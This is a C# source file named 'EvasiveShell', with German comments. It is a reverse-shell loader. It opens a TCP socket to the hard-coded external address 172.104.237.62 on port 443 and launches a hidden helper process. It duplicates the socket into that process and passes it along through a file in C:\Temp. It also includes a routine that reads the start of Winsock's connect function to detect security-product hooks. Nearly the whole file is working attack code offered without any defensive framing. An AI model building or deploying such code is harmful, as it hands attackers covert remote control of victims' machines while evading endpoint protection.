namespace EvasiveShell
{
  using System.Diagnostics;
  using System.Net;
  using System.Net.Sockets;
  using System.Runtime.InteropServices;
  using System.Text;
  using SocketHelpers;

  public class Program
  {
    const uint FIONBIO = 0x8004667E;

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {
      public short sin_family;

      public ushort sin_port;

      public in_addr sin_addr;

      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
      public string sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct in_addr
    {
      public uint S_addr;
    }

    /// <summary>
    /// Importierte Methode um ein Socket zu connecten.
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
    /// </summary>
    /// <param name = "socket" > Das Socket.</param>
    /// <param name = "name" > Pointer auf eine SockAddr Struktur. <see cref= "https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2" /></ param >
    /// < param name= "namelen" > Länge der Sockaddr Struktur</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr socket, IntPtr name, int namelen);

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public uint dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public uint dwProcessId;
      public uint dwThreadId;
    }

    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
      public const uint CREATE_NO_WINDOW = 0x8000000;
      public const uint STARTF_USESTDHANDLES = 0x100;
    }

    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    /// </summary>
    /// <param name = "af" > Address family.Wert von 2 entspricht IPv4.</param>
    /// <param name = "type" > Socket Type.Wert von 1 entspricht stream.</param>
    /// <param name = "protocol" > Protokoll.Wert von 6 entspricht tcp.</param>
    /// <param name = "protocolInfo" > Kann NULL sein.</param>
    /// <param name = "group" > Kann NULL sein.</param>
    /// <param name = "dwFlags" > Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int WSAConnect(IntPtr socket, ref sockaddr_in name, int nameLen, IntPtr lpCallerData, IntPtr lpCalleeData, IntPtr lpSQOS, IntPtr lpGQOS);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort port);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern uint inet_addr(string ipAddress);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern int WSADuplicateSocket(IntPtr s, uint dwProcessId, ref WSAPROTOCOL_INFO lpProtocolInfo);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

    [DllImport("ws2_32.dll", SetLastError = true)]
    static extern int WSAIoctl(IntPtr s, uint dwIoControlCode, ref uint lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, out int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);

    [StructLayout(LayoutKind.Sequential)]
    public struct WSAPROTOCOL_INFO
    {
      public uint dwServiceFlags1;
      public uint dwServiceFlags2;
      public uint dwServiceFlags3;
      public uint dwServiceFlags4;
      public uint dwProviderFlags;
      public Guid ProviderId;
      public uint dwCatalogEntryId;
      public WSAPROTOCOLCHAIN ProtocolChain;
      public int iVersion;
      public int iAddressFamily;
      public int iMaxSockAddr;
      public int iMinSockAddr;
      public int iSocketType;
      public int iProtocol;
      public int iProtocolMaxOffset;
      public int iNetworkByteOrder;
      public int iSecurityScheme;
      public uint dwMessageSize;
      public uint dwProviderReserved;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public byte[] szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WSAPROTOCOLCHAIN
    {
      public int ChainLen;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
      public uint[] ChainEntries;
    }

    public static async Task Main(string[] args)
    {
      if (File.Exists("C:\\Temp\\socketinfo.bin"))
        File.Delete("C:\\Temp\\socketinfo.bin");


      Helpers.InitializeWSA();
      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(443);
      sockAddrIn.sin_addr.S_addr = inet_addr("172.104.237.62");

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);

      Console.WriteLine("Socket established.");
      var protocolInfo = new WSAPROTOCOL_INFO();

      uint nonBlockingMode = 1;
      int ret = WSAIoctl(socket, FIONBIO, ref nonBlockingMode, sizeof(uint), IntPtr.Zero, 0, out int bytesReturned, IntPtr.Zero, IntPtr.Zero);

      if (ret != 0)
        await Console.Out.WriteLineAsync("WSAIoctl failed");
      
      WSAConnect(socket, ref sockAddrIn, Marshal.SizeOf(sockAddrIn), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
      //connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));

      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;

      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"EvasiveShell_SocketConnection.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);

      WSADuplicateSocket(socket, pinfo.dwProcessId, ref protocolInfo);
      Console.WriteLine("Socket dupicated");
      var serialized = SerializeProtocolInfo(protocolInfo);

      if (!Directory.Exists("C:\\Temp"))
        Directory.CreateDirectory("C:\\Temp");

      File.WriteAllBytes("C:\\Temp\\socketinfo.bin", serialized);
    }

    private static bool DetectHooks()
    {
      IntPtr dll = LoadLibrary("Ws2_32.dll");

      if (dll == IntPtr.Zero)
        return false;

      IntPtr functionAddress = GetProcAddress(dll, nameof(connect));

      if (functionAddress == IntPtr.Zero)
      {
        Console.WriteLine("Function address konnte nicht gelesn werden.");
        return false;
      }

      var bytes = new byte[16];
      ReadProcessMemory(Process.GetCurrentProcess().Handle, functionAddress, bytes, bytes.Length, out int bytesRead);

      foreach (var item in bytes)
        Console.WriteLine(item);

      return true;
    }

    private static byte[] SerializeProtocolInfo(WSAPROTOCOL_INFO protocolInfo)
    {
      int size = Marshal.SizeOf(protocolInfo);
      byte[] result = new byte[size];
      IntPtr ptr = Marshal.AllocHGlobal(size);

      try
      {
        Marshal.StructureToPtr(protocolInfo, ptr, true);
        Marshal.Copy(ptr, result, 0, size);
      }
      finally
      {
        Marshal.FreeHGlobal(ptr);
      }

      return result;
    }
  }
}